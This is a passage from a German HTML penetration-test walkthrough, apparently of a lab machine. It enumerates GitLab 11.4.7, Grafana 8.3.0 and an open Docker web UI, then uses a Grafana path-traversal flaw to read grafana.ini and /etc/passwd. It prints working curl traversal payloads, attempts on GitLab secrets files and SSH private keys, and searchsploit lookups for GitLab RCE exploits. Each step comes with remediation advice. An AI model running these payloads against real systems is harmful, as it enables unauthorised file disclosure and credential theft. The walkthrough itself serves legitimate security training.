<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
<span class="password">+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.</span>
<span class="password">+ 8104 requests: 0 error(s) and 3 item(s) reported on remote host</span>
<span class="password">+ End Time:           2025-06-06 23:14:57 (GMT2) (29 seconds)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="password">+ 1 host(s) tested</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich fÃ¼hre einen Nikto-Scan auf der GitLab-Instanz auf Port 5080 durch.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Nikto-Scan auf Port 5080 identifiziert einige interessante Punkte auf der Nginx-Basis. Es werden fehlende Sicherheits-Header bemÃ¤ngelt. Es findet Endpunkte wie `/help/`, `/public/`, `/search.vts` und `/help.php`, die fÃ¼r einen Angreifer von Interesse sein kÃ¶nnten. Die EintrÃ¤ge in `robots.txt` werden ebenfalls als potenziell interessant hervorgehoben. Die Header `x-runtime` und `x-request-id` sind anwendungsspezifische Header von GitLab. Der kritischste Punkt bleibt die GitLab-Version 11.4.7 selbst.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Konzentrieren Sie sich auf bekannte Schwachstellen in GitLab 11.4.7. Die gefundenen Endpunkte (z.B. `/help/`, `/public/`) sollten weiter untersucht werden, insbesondere nach LFI/RFI oder anderen Schwachstellen, die ohne Authentifizierung ausgenutzt werden kÃ¶nnen.
                <br>**Empfehlung (Admin):** Aktualisieren Sie GitLab umgehend. ÃœberprÃ¼fen Sie die Konfiguration von Nginx und GitLab auf ungesicherte Endpunkte oder Informationslecks. Implementieren Sie Sicherheits-Header.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nikto -h http://192.168.2.215:5080</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">- Nikto v2.5.0</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Target IP:          192.168.2.215</span>
<span class="command">+ Target Hostname:    192.168.2.215</span>
<span class="command">+ Target Port:        5080</span>
<span class="password">+ Start Time:         2025-06-06 23:15:55 (GMT2)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Server: nginx</span>
<span class="command">+ /: Uncommon header 'x-runtime' found, with contents: 0.012865.</span>
<span class="command">+ /: Uncommon header 'x-request-id' found, with contents: b866f93b-28f1-4044-9896-b635a8a2f5ba.</span>
<span class="command">+ Root page / redirects to: [Link: http://192.168.2.215/users/sign_in | Ziel: http://192.168.2.215/users/sign_in]</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
<span class="password">+ /robots.txt: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
<span class="password">+ /robots.txt: Entry '/users/sign_in/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
<span class="password">+ /robots.txt: Entry '/search/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
<span class="password">+ /robots.txt: Entry '/autocomplete/users/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
<span class="password">+ /robots.txt: Entry '/help/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
<span class="password">+ /robots.txt: contains 53 entries which should be manually viewed. See: [Link: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt | Ziel: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt]</span>
<span class="password">+ /help/: Help directory should not be accessible.</span>
<span class="password">+ /public/: This might be interesting.</span>
<span class="password">+ /search.vts: This might be interesting.</span>
<span class="command">+ /help/home.html: Uncommon header 'x-gitlab-custom-error' found, with contents: 1.</span>
<span class="password">+ /help.php: A help file was found.</span>
<span class="password"> + /.well-known/openid-configuration: OpenID Provider Configuration Information.</span>
<span class="password">+ 8157 requests: 0 error(s) and 14 item(s) reported on remote host</span>
<span class="password">+ End Time:           2025-06-06 23:18:39 (GMT2) (164 seconds)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="password">+ 1 host(s) tested</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich Ã¼berprÃ¼fe erneut die `robots.txt` Datei fÃ¼r den Grafana-Dienst auf Port 3000, wie bereits im Nmap-Scan erwÃ¤hnt.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Datei ist sehr kurz und enthÃ¤lt nur `User-agent: *` und `Disallow: /`. Dies ist eine sehr restriktive `robots.txt`, die Crawlern im Wesentlichen anweist, die gesamte Website nicht zu indizieren. FÃ¼r einen Angreifer ist die Hauptinformation hier, dass der Betreiber nicht mÃ¶chte, dass die Seite indiziert wird, was auf sensible Inhalte hindeuten kÃ¶nnte, aber keine direkte Schwachstelle darstellt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Dokumentieren Sie die `robots.txt`, aber legen Sie den Fokus auf interaktive Bereiche wie die Login-Seite oder auf Endpunkte, die fÃ¼r bekannte Schwachstellen relevant sind.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass `robots.txt` korrekt konfiguriert ist, aber verlassen Sie sich nicht darauf als SicherheitsmaÃŸnahme.
            </p>
            <p>
                Analyse der `robots.txt` Datei fÃ¼r den Grafana-Dienst auf Port 3000:
            </p>
            <pre>
<span class="command">http://192.168.2.215:3000/robots.txt</span>
<span class="command">User-agent: *</span>
<span class="command">Disallow: /</span>
</pre>

            <p class="analysis">
                **Analyse:** Ich navigiere zur Hauptseite der Docker Web UI auf Port 9000 und dokumentiere die Ansicht. Die Seite zeigt eine Liste der laufenden Container, was die Informationen aus dem Nmap-Scan bestÃ¤tigt. Die Liste enthÃ¤lt die ID, Namen, Kommandos, Port-Mappings und Images der Container, die ich bereits analysiert habe.
            </p>
            <p class="evaluation">
                **Bewertung:** Diese unauthentifizierte Web-OberflÃ¤che, die detaillierte Informationen Ã¼ber die laufenden Docker-Container preisgibt, ist eine beachtliche Schwachstelle. Ich kann sehen, welche Dienste in welchen Containern laufen, ihre Images und Port-Mappings. Dies liefert mir wertvolle Informationen fÃ¼r die weitere Enumeration und potenzielle Container-Escape-Versuche, falls die UI interaktive Funktionen ohne Authentifizierung bietet.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuchen Sie die Docker Web-UI auf Port 9000 auf alle interaktiven Funktionen (z.B. Logs ansehen, Container starten/stoppen/exec, Images verwalten). Dies ist eine sehr vielversprechende AngriffsflÃ¤che.
                <br>**Empfehlung (Admin):** **Dringend:** Entfernen Sie die ungeschÃ¼tzte Docker Web UI auf Port 9000 aus dem Netzwerkzugriff. Docker Management-Schnittstellen sollten niemals Ã¶ffentlich zugÃ¤nglich sein und immer eine starke Authentifizierung erfordern.
            </p>
            <p>
                Analyse der Docker Web UI auf Port 9000 und Ãœbersicht der laufenden Container:
            </p>
            <pre>
<span class="command">http://192.168.2.215:9000/</span>
<span class="command">docker web-ui</span>

    <span class="command">containers</span>
    <span class="command">logs</span>
    <span class="command">stats</span>
    |
    <span class="command">images</span>
    |
    <span class="command">clients</span>

<span class="command">4 containers</span>
<span class="command">ID	Names	Command	Ports	Repository &amp; Tags	Status</span>
<span class="command">3573	</span>

    <span class="command">boring_tharp</span>

	<span class="command">python /app/a..	0.0.0.0:8080-&gt;8080/tcp	whalesalad/docker-debug	Up an hour</span>
<span class="command">12e8	</span>

    <span class="command">gitlab-docker_web_1</span>

	<span class="command">/assets/wrapp..	0.0.0.0:5022-&gt;22/tcp,0.0.0.0:50443-&gt;443/tcp,0.0.0.0:5080-&gt;80/tcp	gitlab/gitlab-ce:11.4.7-ce.0	Up an hour (healthy)</span>
<span class="command">c2f5	</span>

    <span class="command">grafana</span>

	<span class="command">/run.sh	0.0.0.0:3000-&gt;3000/tcp	grafana/grafana-enterprise:8.3.0-ubuntu	Up an hour</span>
<span class="command">4001	</span>

    <span class="command">peaceful_jennings</span>

	<span class="command">docker-webui ..	0.0.0.0:9000-&gt;9000/tcp	pottava/docker-webui	Up an hour</span>
</pre>
        </section>

        <section id="initial-access">
            <h2>Initial Access</h2>
             <p class="analysis">
                **Analyse:** Basierend auf der Feroxbuster-Ausgabe auf Port 5080, die Endpunkte wie `/users/root/projects.json` zeigte, versuche ich, diese Endpunkte Ã¼ber die GitLab API (oder was auch immer dahintersteckt) abzufragen. Ich benutze `curl -s` und pipe die JSON-Ausgabe an `jq .` zur besseren Lesbarkeit. Dies ist ein Versuch, Ã¶ffentlich zugÃ¤ngliche API-Endpunkte fÃ¼r Informationslecks zu finden. Parallel dazu versuche ich, das Repository `root/internal-stuff.git` von der GitLab-Instanz (Port 5080) mit `git clone` zu klonen, um zu sehen, ob es Ã¶ffentlich zugÃ¤nglich ist oder Anmeldedaten erfordert.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Abfrage von `/users/root/projects.json` zeigt ein leeres Ergebnis (`"count": 0`), was bedeutet, dass es keine Ã¶ffentlich sichtbaren Projekte fÃ¼r den Benutzer "root" gibt. Der `git clone` Versuch schlÃ¤gt fehl, da die Authentifizierung fehlschlÃ¤gt (Ich breche die Passwortabfrage ab). Dies bestÃ¤tigt, dass ich Anmeldedaten benÃ¶tige, um auf Projekte zuzugreifen oder die API weiter zu nutzen. Der Weg Ã¼ber Ã¶ffentlich zugÃ¤ngliche API-Endpunkte scheint blockiert zu sein. Der Fokus muss auf die Erlangung von Anmeldedaten oder die Ausnutzung einer Schwachstelle, die keine Authentifizierung erfordert (z.B. auf Grafana Port 3000), gelegt werden.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Da der direkte Zugriff auf GitLab-Projekte oder API-Endpunkte ohne Authentifizierung nicht mÃ¶glich ist, konzentrieren Sie sich darauf, Anmeldedaten zu finden. ÃœberprÃ¼fen Sie alle anderen gefundenen Dienste (Grafana, Docker UI) auf Schwachstellen, die Anmeldedaten oder einen initialen Shell-Zugriff ermÃ¶glichen kÃ¶nnten.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass GitLab-API-Endpunkte korrekt gesichert sind und keine sensiblen Informationen ohne Authentifizierung preisgeben. Private Repositorys sollten nicht Ã¶ffentlich klonbar sein.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl -s http://192.168.2.215:5080/users/root/projects.json | jq .</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">{</span>
  <span class="command">"html": "&lt;div class=\"js-projects-list-holder\"&gt;\n&lt;div class=\"nothing-here-block\"&gt;No projects found&lt;/div&gt;\n&lt;/div&gt;\n"</span>,
  <span class="command">"count": 0</span>
<span class="command">}</span>
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~/firefoxcrack]<br>â””â”€# <span class="command">git clone http://192.168.2.215:5080/root/internal-stuff.git</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">Klone nach 'internal-stuff'...</span>
Username for 'http://192.168.2.215:5080': <span class="password">^C</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Angesichts der identifizierten GitLab-Version 11.4.7 und der Tatsache, dass ich Anmeldedaten benÃ¶tige, suche ich auf Exploit-Datenbanken nach bekannten Schwachstellen fÃ¼r diese Version, insbesondere nach Remote Code Execution (RCE)-Exploits. Ich verwende `searchsploit`, das lokale Exploit-Datenbanken durchsucht. Der Befehl `searchsploit gitlab 11.4` sucht nach EintrÃ¤gen, die "gitlab" und "11.4" im Titel enthalten.
            </p>
            <p class="evaluation">
                **Bewertung:** **Wichtiger Fund!** Searchsploit listet zwei authentifizierte RCE-Exploits fÃ¼r GitLab 11.4.7 auf (Exploit-DB IDs 49257 und 49334). Einer davon (`49334.py`) ist ein Python-Skript und wird als vielversprechend fÃ¼r eine automatisierte Ausnutzung angesehen, sobald Anmeldedaten verfÃ¼gbar sind. Es gibt auch einen Passwort-Reset-Exploit fÃ¼r neuere Versionen, der hier nicht relevant ist. Die RCE-Exploits sind authentifiziert, was bedeutet, ich benÃ¶tige weiterhin einen gÃ¼ltigen Login.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Fokussieren Sie sich darauf, Anmeldedaten fÃ¼r GitLab zu erhalten, um diesen authentifizierten RCE-Exploit nutzen zu kÃ¶nnen. Speichern Sie das Exploit-Skript lokal und machen Sie sich mit dessen Usage vertraut.
                <br>**Empfehlung (Admin):** Aktualisieren Sie GitLab umgehend auf eine Version, die nicht von diesen RCE-Schwachstellen betroffen ist.
            </p>
            <p>
                Suche nach Exploits fÃ¼r GitLab Version 11.4.7 mit Searchsploit:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~/firefoxcrack]<br>â””â”€# <span class="command">searchsploit gitlab 11.4</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">------------------------------------------------------------ ---------------------------------</span>
 <span class="command">Exploit Title                                              |  Path</span>
<span class="password">------------------------------------------------------------ ---------------------------------</span>
<span class="command">GitLab 11.4.7 - RCE (Authenticated) (2)                     | ruby/webapps/49334.py</span>
<span class="command">GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)   | ruby/webapps/49257.py</span>
<span class="command">GitLab CE/EE &lt; 16.7.2 - Password Reset                      | java/remote/51889.txt</span>
<span class="password">------------------------------------------------------------ ---------------------------------</span>
<span class="command">Shellcodes: No Results</span>
</pre>
                </div>
            </div>
            <p class="analysis">
                **Analyse:** Ich kopiere das vielversprechendste Python-Exploit-Skript fÃ¼r die Authentifizierte RCE in GitLab 11.4.7 (Exploit-DB ID 49334) in mein aktuelles Verzeichnis, um es spÃ¤ter zu nutzen. Der Befehl `searchsploit -m 49334` kopiert das Skript.
            </p>
            <p class="evaluation">
                **Bewertung:** Ich habe nun das notwendige Werkzeug, um die RCE-Schwachstelle in GitLab auszunutzen, sobald ich Ã¼ber gÃ¼ltige Anmeldedaten verfÃ¼ge. Der nÃ¤chste Schritt ist also klar: Ich muss einen Weg finden, mich bei GitLab anzumelden.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Laden Sie relevante Exploits herunter und bereiten Sie sie vor, sobald Sie potenzielle Schwachstellen identifiziert haben.
                <br>**Empfehlung (Admin):** Verfolgen Sie Exploit-Datenbanken und Sicherheitshinweise fÃ¼r die von Ihnen eingesetzte Software und patchen Sie umgehend, wenn Schwachstellen (insbesondere RCE) verÃ¶ffentlicht werden.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">searchsploit -m 49334</span></div>
                </div>
                <div class="terminal">
                    <pre>
  <span class="command">Exploit: GitLab 11.4.7 - RCE (Authenticated) (2)</span>
      <span class="command">URL: [Link: https://www.exploit-db.com/exploits/49334 | Ziel: https://www.exploit-db.com/exploits/49334]</span>
     <span class="command">Path: /usr/share/exploitdb/exploits/ruby/webapps/49334.py</span>
    <span class="command">Codes: CVE-2018-19585, CVE-2018-19571</span>
 <span class="command">Verified: False</span>
<span class="command">File Type: Python script, ASCII text executable, with very long lines (359)</span>
<span class="password">Copied to: /root/49334.py</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich beginne mit der Untersuchung des Grafana-Dienstes auf Port 3000 auf eine Local File Inclusion (LFI) Schwachstelle. Ich teste einen Path-Traversal-Payload (`../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`) im URL-Pfad, speziell in einem mutmaÃŸlichen Endpunkt wie `/public/plugins/welcome/`, da Webanwendungen oft versuchen, Dateien basierend auf URL-Segmenten einzubinden. Die Option `--path-as-is` in `curl` ist wichtig, um die Dots (`..`) und SchrÃ¤gstriche (`/`) nicht normalisieren zu lassen. Ich versuche, eine Konfigurationsdatei von GitLab zu lesen, da diese oft Anmeldedaten enthalten.
            </p>
            <p class="evaluation">
                **Bewertung:** Der erste Versuch, die `secrets.yml` von GitLab Ã¼ber die vermutete Grafana-LFI zu lesen, schlÃ¤gt fehl. Die Fehlermeldung `"message": "Plugin file not found"` deutet darauf hin, dass der Pfad nicht korrekt aufgelÃ¶st wird oder dass der Endpunkt `/public/plugins/welcome/` nicht fÃ¼r LFI anfÃ¤llig ist, oder dass der Dateipfad nicht existiert oder nicht lesbar ist. Dies war ein erster Testversuch mit einer Hypothese.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Testen Sie verschiedene Endpunkte und verschiedene Path-Traversal-Payloads. Versuchen Sie, Systemdateien wie `/etc/passwd` zu lesen, um zu sehen, ob LFI Ã¼berhaupt mÃ¶glich ist und wie sich die Anwendung bei erfolgreichem oder fehlgeschlagenem Dateizugriff verhÃ¤lt.
                <br>**Empfehlung (Admin):** Implementieren Sie eine strikte Validierung von Dateipfaden in URL-Parametern oder Pfadsegmenten, um Path-Traversal-Angriffe zu verhindern.
            </p>
            <p>
                Versuch, GitLab-Konfigurationsdateien Ã¼ber eine potenzielle LFI in Grafana zu lesen:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/welcome/../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">{</span>
  <span class="command">"message": "Plugin file not found"</span>
<span class="command">}</span>
</pre>
                </div>
            </div>
            <p class="analysis">
                **Analyse:** Ich teste einen weiteren GitLab-Konfigurationspfad (`../../../../../../../../etc/gitlab/gitlab-secrets.json`) Ã¼ber dieselbe mutmaÃŸliche Grafana-LFI Schwachstelle.
            </p>
            <p class="evaluation">
                **Bewertung:** Auch dieser Versuch schlÃ¤gt fehl mit derselben Fehlermeldung `"message": "Plugin file not found"`. Das verstÃ¤rkt die Vermutung, dass entweder dieser spezifische Pfad in der Grafana-Instanz nicht existiert oder nicht lesbar ist, oder dass der `/public/plugins/welcome/` Endpunkt doch nicht fÃ¼r LFI anfÃ¤llig ist. Ich muss die LFI-AnfÃ¤lligkeit selbst noch verifizieren.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Als NÃ¤chstes die LFI-AnfÃ¤lligkeit selbst verifizieren, z.B. durch den Versuch, `/etc/passwd` zu lesen, was auf nahezu jedem Linux-System existiert und lesbar ist.
                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlung zur Validierung von Dateipfaden).
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/welcome/../../../../../../../../etc/gitlab/gitlab-secrets.json"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">{</span>
  <span class="command">"message": "Plugin file not found"</span>
<span class="command">}</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich betrachte den Source Code der Grafana-Login-Seite auf Port 3000. Der Text im Bericht zeigt einen Ausschnitt des Codes mit einer JSON-Struktur, die verschiedene "panels" auflistet.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Source Code der Login-Seite selbst gibt in diesem Ausschnitt keine offensichtlichen Hinweise auf Schwachstellen. Die gelisteten Panels sind Standardkomponenten von Grafana. Wichtiger ist die allgemeine Struktur der URL, die auf ein Plugin-Verzeichnis hindeutet (`/public/plugins/welcome/`), das ich fÃ¼r LFI-Versuche genutzt habe.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** ÃœberprÃ¼fen Sie den gesamten Source Code auf Hinweise zu Endpunkten, Parametern, API-SchlÃ¼sseln oder Kommentaren, die nÃ¼tzliche Informationen enthalten kÃ¶nnten.
                <br>**Empfehlung (Admin):** Vermeiden Sie es, unnÃ¶tige oder sensible Informationen im Ã¶ffentlich zugÃ¤nglichen Source Code zu belassen.
            </p>
            <p>
                Analyse des Source Codes der Grafana-Login-Seite:
            </p>
            <pre>
<span class="command">view-source:http://192.168.2.215:3000/login</span>

<span class="command">"panels":{</span>
    <span class="command">"alertlist":{ ... },</span>
    <span class="command">"annolist":{ ... },</span>
    <span class="command">"barchart":{ ... },</span>
    <span class="command">"bargauge":{ ... },</span>
    <span class="command">"dashlist":{ ... },</span>
    <span class="command">"graph":{ ... },</span>
    <span class="command">"heatmap":{ ... }</span>
<span class="command">}</span>
</pre>

            <p class="analysis">
                **Analyse:** Ich verifiziere nun die LFI-AnfÃ¤lligkeit auf dem Grafana-Dienst, indem ich versuche, die Standard-Systemdatei `/etc/grafana/grafana.ini` zu lesen. Ich verwende denselben Ansatz mit `curl --path-as-is` und Path-Traversal-Payloads, diesmal ausgehend von einem anderen Endpunkt, der ebenfalls in den Grafana-Plugins zu liegen scheint: `/public/plugins/alertlist/`.
            </p>
            <p class="evaluation">
                **Bewertung:** **Erfolg!** Diesmal gibt die Anfrage den Inhalt der Datei `/etc/grafana/grafana.ini` zurÃ¼ck. Dies beweist eine ausnutzbare Local File Inclusion (LFI) Schwachstelle auf dem Grafana-Dienst Ã¼ber den Pfad `/public/plugins/alertlist/`. Ich kann nun beliebige Dateien auf dem System lesen, auf die der Grafana-Prozess Zugriff hat. Die Datei `grafana.ini` ist eine Konfigurationsdatei, die potenziell sensible Informationen wie Anmeldedaten fÃ¼r Datenbanken oder externe Dienste enthÃ¤lt. Besonders interessant sind die auskommentierten Standard-Anmeldedaten (`admin_user = admin`, `admin_password = admin`) und der `secret_key`. WÃ¤hrend die Standard-Anmeldedaten wahrscheinlich geÃ¤ndert wurden, ist der `secret_key` potenziell nÃ¼tzlich.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutzen Sie diese LFI, um weitere System- und Konfigurationsdateien zu lesen, die Anmeldedaten oder andere nÃ¼tzliche Informationen enthalten kÃ¶nnten (z.B. `/etc/passwd`, SSH-SchlÃ¼ssel, andere Konfigurationsdateien). Der gefundene `secret_key` kÃ¶nnte fÃ¼r andere Angriffe relevant sein.
                <br>**Empfehlung (Admin):** **Dringend:** Beheben Sie die LFI-Schwachstelle im Grafana-Dienst. ÃœberprÃ¼fen Sie die Konfiguration, die den Dateizugriff Ã¼ber `/public/plugins/` ermÃ¶glicht. Stellen Sie sicher, dass sensible Konfigurationsdateien restriktive Dateisystemberechtigungen haben. Standard-Anmeldedaten mÃ¼ssen immer geÃ¤ndert werden.
            </p>
            <p>
                Erfolgreiche Ausnutzung der LFI in Grafana zum Lesen der Konfigurationsdatei `/etc/grafana/grafana.ini`:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">##################### Grafana Configuration Example #####################</span>
<span class="command">#################################### Security ####################################</span>
<span class="command">[security]</span>
<span class="comment"># disable creation of admin user on first start of grafana</span>
<span class="command">;disable_initial_admin_creation = false</span>

<span class="comment"># default admin user, created on startup</span>
<span class="command">;admin_user = admin</span>

<span class="comment"># default admin password, can be changed before first start of grafana,  or in profile settings</span>
<span class="command">;admin_password = admin</span>

<span class="comment"># used for signing</span>
<span class="command">;secret_key = <span class="password">SW2YcwTIb9zpOOhoPsMm</span></span>
....
...
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit der bestÃ¤tigten LFI auf Grafana (Port 3000) versuche ich nun, die Datei `/etc/passwd` zu lesen, um eine Liste der Benutzer auf dem System zu erhalten. Ich verwende wieder den `curl --path-as-is` Ansatz.
            </p>
            <p class="evaluation">
                **Bewertung:** **Erfolg!** Ich konnte den Inhalt von `/etc/passwd` lesen. Dies liefert eine Liste aller Systembenutzer, ihrer UIDs, GIDs, Home-Verzeichnisse und Standard-Shells. Ich sehe Standardbenutzer wie `root`, `daemon`, `www-data` etc. und auch spezifische Benutzer wie `grafana` (UID 472) und einen Benutzer, der im Kontext des Ziels relevant sein kÃ¶nnte (spÃ¤ter als `cachalot` im Home-Verzeichnis gefunden). Wichtig ist hier, dass `root` eine interaktive Shell (`/bin/bash`) hat, ebenso wie einige andere Systembenutzer. Der Benutzer `grafana` hat `/usr/sbin/nologin`, was bedeutet, er kann sich nicht direkt anmelden.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysieren Sie die `/etc/passwd` Ausgabe sorgfÃ¤ltig auf nicht-standardmÃ¤ÃŸige Benutzer (UID > 1000) und Benutzer mit interaktiven Shells. Dies gibt potenzielle Ziele fÃ¼r die Privilege Escalation.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass nur Benutzer, die sich anmelden mÃ¼ssen, eine interaktive Shell zugewiesen haben.
            </p>
            <p>
                Lesen der `/etc/passwd` Datei Ã¼ber die Grafana-LFI:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">root:x:0:0:root:/root:/bin/bash</span>
<span class="command">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
<span class="command">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
<span class="command">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
<span class="command">sync:x:4:65534:sync:/bin:/bin/sync</span>
<span class="command">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
<span class="command">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
<span class="command">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
<span class="command">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
<span class="command">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
<span class="command">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
<span class="command">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
<span class="command">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
<span class="command">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
<span class="command">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
<span class="command">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
<span class="command">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
<span class="command">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
<span class="command">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span>
<span class="command">grafana:x:472:0::/home/grafana:/usr/sbin/nologin</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit der LFI versuche ich nun, SSH-SchlÃ¼sseldateien zu lesen. Ich beginne mit der `id_rsa` fÃ¼r den Benutzer `grafana` (`/home/grafana/.ssh/id_rsa`), da der Grafana-Prozess wahrscheinlich mit den Rechten des `grafana` Benutzers lÃ¤uft und Zugriff auf dessen Home-Verzeichnis haben kÃ¶nnte. Ich nutze wieder `curl --path-as-is`.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Versuch, die `id_rsa` von `grafana` zu lesen, schlÃ¤gt mit `"message": "Plugin file not found"` fehl. Dies kÃ¶nnte bedeuten, dass die Datei nicht existiert, die Berechtigungen das Lesen verhindern oder die LFI den Zugriff auf `.ssh` Verzeichnisse oder Dateien mit Punkten im Namen blockiert.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Testen Sie, ob die LFI das Lesen anderer Dateien im Home-Verzeichnis von `grafana` erlaubt (z.B. .bashrc) und ob das Lesen von Dateien mit Punkten mÃ¶glich ist. Versuchen Sie auch, die Ã¶ffentliche SchlÃ¼sseldatei (`id_rsa.pub`) zu lesen.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass private SchlÃ¼sseldateien (`id_rsa`) nur fÃ¼r den EigentÃ¼mer lesbar sind (`chmod 600`). LFI-Schwachstellen beheben, um jeglichen unbefugten Dateizugriff zu verhindern.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.ssh/id_rsa"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">{</span>
  <span class="command">"message": "Plugin file not found"</span>
<span class="command">}</span>
</pre>
                </div>
            </div>
            <p class="analysis">
